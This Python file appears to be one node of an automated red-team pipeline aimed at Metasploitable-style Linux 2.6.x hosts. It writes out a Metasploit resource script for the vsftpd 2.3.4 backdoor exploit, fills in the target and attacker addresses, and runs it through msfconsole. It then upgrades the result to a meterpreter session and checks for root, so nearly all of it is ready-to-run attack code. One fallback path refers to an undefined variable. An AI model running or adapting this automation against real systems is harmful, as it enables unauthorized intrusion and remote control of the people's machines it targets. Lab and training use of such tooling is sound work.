#!/usr/bin/env python3
"""
NODE 7 BACKUP M2: MANUAL EXPLOIT TEMPLATE RUNNER
Executes known working exploits for Linux 2.6.x systems
Simple template-based approach - just replace placeholders and run
"""

import logging
import time
import subprocess
from pathlib import Path
from typing import Dict
import os
import random


def node_7_backup_m2_manual_exploit_to_rc(state: Dict) -> Dict:
    """
    NODE 7 BACKUP M2: Run Manual Exploit Template for Linux 2.6.x

    ═══════════════════════════════════════════════════════════════════════════
    PURPOSE
    ═══════════════════════════════════════════════════════════════════════════

    Final fallback after Node 6 if NO meterpreter session obtained and OS is
    in supported range (Linux 2.6.x - Metasploitable):

    1. Check if OS is Linux 2.6.x
    2. Take manual exploit template
    3. Replace placeholders: {TARGET_IP}, {PORT}, {LHOST}, {LPORT}
    4. Write to pwn.rc file
    5. Execute via msfconsole
    6. Check for meterpreter session

    Template Example:
        use exploit/unix/ftp/vsftpd_234_backdoor
        set RHOSTS {TARGET_IP}
        set RPORT {PORT}
        set LHOST {LHOST}
        set LPORT {LPORT}
        run -z

        sleep 3
        sessions -u 1
        sleep 5
        sessions

    ═══════════════════════════════════════════════════════════════════════════
    INPUT STATE REQUIREMENTS
    ═══════════════════════════════════════════════════════════════════════════

    Required:
    - target: Target IP address
    - port: Target port
    - os_type: Detected OS string
    - lhost: Attacker IP address
    - session_dir: Path to session directory
    - msf_client: Metasploit RPC client

    ═══════════════════════════════════════════════════════════════════════════
    OUTPUT STATE UPDATES
    ═══════════════════════════════════════════════════════════════════════════

    On Success:
    - pwn_rc_generated: True
    - pwn_rc_path: Path to generated pwn.rc file
    - pwn_rc_source: "node_7_backup_m2"
    - primary_session_id: Meterpreter session ID
    - primary_session_type: "meterpreter"
    - is_root: True/False
    - privilege_level: "high" or "low"

    On OS Not in Range:
    - pwn_rc_generated: False
    - error: "OS not in supported range (Linux 2.6.x required)"

    On Failure:
    - pwn_rc_generated: False
    - error: Error message
    """

    logger = logging.getLogger("red_agent.node_7_backup_m2")

    logger.info("═" * 80)
    logger.info("NODE 7 BACKUP M2: MANUAL EXPLOIT TEMPLATE RUNNER")
    logger.info("(Final fallback after Node 6 for Linux 2.6.x systems)")
    logger.info("═" * 80)
    logger.info("")

    # ═══════════════════════════════════════════════════════════════════════════
    # STEP 1: CHECK OS RANGE (Linux 2.6.x ONLY)
    # ═══════════════════════════════════════════════════════════════════════════
    logger.info("STEP 1: Checking OS Range")
    logger.info("─" * 80)

    os_type = state.get("os_type", "Linux")

    # Check if OS is in supported range (Linux 2.6.x)
    if not ("2.6" in str(os_type).lower()):
        logger.error("❌ OS NOT IN SUPPORTED RANGE")
        logger.error(f"   Detected OS: {os_type}")
        logger.error(f"   Required: Linux 2.6.x (Metasploitable)")
        return {
            **state,
            "pwn_rc_generated": False,
            "error": f"OS not in supported range. Got: {os_type}, Required: Linux 2.6.x"
        }

    logger.info(f"✓ OS in supported range: {os_type}")
    logger.info("")

    # ═══════════════════════════════════════════════════════════════════════════
    # STEP 2: EXTRACT TARGET INFORMATION
    # ═══════════════════════════════════════════════════════════════════════════
    logger.info("STEP 2: Extracting Target Information")
    logger.info("─" * 80)

    target = state.get("target")
    lhost = state.get("lhost")
    session_dir = state.get("session_dir")

    # Node 7 ALWAYS uses port 21 for FTP (ignore port from state)
    ftp_port = 21

    if not all([target, lhost]):
        logger.error("❌ Missing required parameters (target, lhost)")
        return {
            **state,
            "pwn_rc_generated": False,
            "error": "Missing required: target or lhost"
        }

    logger.info(f"✓ Target: {target}:{ftp_port} (FTP)")
    logger.info(f"✓ Exploit: exploit/unix/ftp/vsftpd_234_backdoor")
    logger.info(f"✓ LHOST (Attacker): {lhost}")
    logger.info("")

    # ═══════════════════════════════════════════════════════════════════════════
    # STEP 3: CREATE PWN.RC FROM TEMPLATE
    # ═══════════════════════════════════════════════════════════════════════════
    logger.info("STEP 3: Creating pwn.rc from template")
    logger.info("─" * 80)

    # Generate random LPORT to avoid conflicts
    lport = random.randint(7000, 8999)

    # Manual exploit template - always uses port 21 for FTP
    template = """use exploit/unix/ftp/vsftpd_234_backdoor
set RHOSTS {TARGET_IP}
set RPORT {FTP_PORT}
set LHOST {LHOST}
set LPORT {LPORT}
run -z

sleep 3

sessions -u 1

sleep 5

exit
"""

    # Replace placeholders with actual values
    pwn_rc_content = template.format(
        TARGET_IP=target,
        FTP_PORT=ftp_port,
        LHOST=lhost,
        LPORT=lport
    )

    logger.info(f"✓ Template placeholders replaced:")
    logger.info(f"  TARGET_IP → {target}")
    logger.info(f"  FTP_PORT → {ftp_port} (always 21)")
    logger.info(f"  LHOST → {lhost}")
    logger.info(f"  LPORT → {lport}")
    logger.info("")

    # ═══════════════════════════════════════════════════════════════════════════
    # STEP 4: SAVE PWN.RC FILE
    # ═══════════════════════════════════════════════════════════════════════════
    logger.info("STEP 4: Saving pwn.rc file")
    logger.info("─" * 80)

    try:
        # Use session_dir if available
        if session_dir:
            exploit_dir = Path(session_dir)
        else:
            timestamp = time.strftime("%Y%m%d_%H%M%S")
            exploitations_dir = Path(__file__).parent.parent / "exploitations"
            exploitations_dir.mkdir(exist_ok=True)
            exploit_dir = exploitations_dir / f"node_7_manual_{target}_{port}_{timestamp}"
            exploit_dir.mkdir(exist_ok=True)

        pwn_rc_path = exploit_dir / "generated_pwn.rc"
        pwn_rc_path.write_text(pwn_rc_content)
        pwn_rc_path.chmod(0o755)  # Make executable
        logger.info(f"✓ Saved pwn.rc to {pwn_rc_path}")

    except Exception as e:
        logger.error(f"❌ Failed to save pwn.rc: {e}")
        return {
            **state,
            "pwn_rc_generated": False,
            "error": f"Failed to save pwn.rc: {str(e)}"
        }

    logger.info("")

    # ═══════════════════════════════════════════════════════════════════════════
    # STEP 5: EXECUTE PWN.RC VIA MSFCONSOLE
    # ═══════════════════════════════════════════════════════════════════════════
    logger.info("STEP 5: Executing pwn.rc via msfconsole")
    logger.info("─" * 80)

    logger.info(f"Running: msfconsole -q -r {pwn_rc_path}")
    logger.info("Executing manual exploit template...")
    logger.info("")

    try:
        # Capture msfconsole output and stream it to logs
        result = subprocess.run(
            ["msfconsole", "-q", "-r", str(pwn_rc_path)],
            capture_output=True,
            text=True,
            stdin=subprocess.DEVNULL,  # Close stdin so msfconsole doesn't wait for input
            timeout=300  # 5 minute timeout
        )

        # Log all msfconsole output to frontend
        logger.info("═" * 80)
        logger.info("MSFCONSOLE OUTPUT:")
        logger.info("═" * 80)
        for line in result.stdout.split('\n'):
            if line.strip():
                logger.info(line)
        if result.stderr:
            for line in result.stderr.split('\n'):
                if line.strip():
                    logger.warning(f"[STDERR] {line}")
        logger.info("═" * 80)

        logger.info("")
        logger.info("✓ pwn.rc execution completed")
        logger.info("Waiting for sessions to be registered...")

        time.sleep(5)

    except subprocess.TimeoutExpired:
        logger.warning("⚠️  msfconsole execution timed out (checking sessions...)")
        time.sleep(5)
    except Exception as e:
        logger.error(f"❌ Failed to execute msfconsole: {e}")
        return {
            **state,
            "pwn_rc_generated": False,
            "error": f"Failed to execute msfconsole: {str(e)}"
        }

    logger.info("")

    # ═══════════════════════════════════════════════════════════════════════════
    # STEP 6: CHECK FOR METERPRETER SESSION
    # ═══════════════════════════════════════════════════════════════════════════
    logger.info("STEP 6: Checking for Meterpreter Session")
    logger.info("─" * 80)

    msf_client = state.get("msf_client")
    if not msf_client:
        logger.warning("⚠️  MSF client not available, skipping session check")
        return {
            **state,
            "pwn_rc_generated": True,
            "pwn_rc_path": str(pwn_rc_path),
            "pwn_rc_source": "node_7_backup_m2",
            "note": "pwn.rc executed, check msfconsole for meterpreter session"
        }

    try:
        time.sleep(3)
        sessions = msf_client.sessions.list

        logger.info(f"Active sessions: {len(sessions)}")

        # Find meterpreter sessions
        meterpreter_sessions = [
            (sid, info) for sid, info in sessions.items()
            if info.get('type') == 'meterpreter'
        ]

        if meterpreter_sessions:
            # Get the most recent (highest ID) meterpreter session
            meterpreter_sid = max([sid for sid, _ in meterpreter_sessions])
            logger.info(f"✅ Found meterpreter session: {meterpreter_sid}")

            # Check if root
            is_root = False
            try:
                session = msf_client.sessions.session(meterpreter_sid)
                uid_output = session.run_command("id")
                is_root = "uid=0(root)" in uid_output
                logger.info(f"   User: {'root' if is_root else 'non-root'}")
                logger.info(f"   Output: {uid_output.strip()}")
            except Exception as e:
                logger.warning(f"⚠️  Could not verify root: {e}")
                is_root = False

            return {
                **state,
                "pwn_rc_generated": True,
                "pwn_rc_path": str(pwn_rc_path),
                "pwn_rc_source": "node_7_backup_m2",
                "primary_session_id": meterpreter_sid,
                "primary_session_type": "meterpreter",
                "is_root": is_root,
                "privilege_level": "high" if is_root else "low",
                "next_phase": "post_exploitation"
            }
        else:
            logger.warning("⚠️  No meterpreter session found")
            return {
                **state,
                "pwn_rc_generated": True,
                "pwn_rc_path": str(pwn_rc_path),
                "pwn_rc_source": "node_7_backup_m2",
                "note": "pwn.rc executed but no meterpreter session detected"
            }

    except Exception as e:
        logger.warning(f"⚠️  Error checking sessions: {e}")
        return {
            **state,
            "pwn_rc_generated": True,
            "pwn_rc_path": str(pwn_rc_path),
            "pwn_rc_source": "node_7_backup_m2",
            "note": f"pwn.rc executed, error checking sessions: {str(e)}"
        }
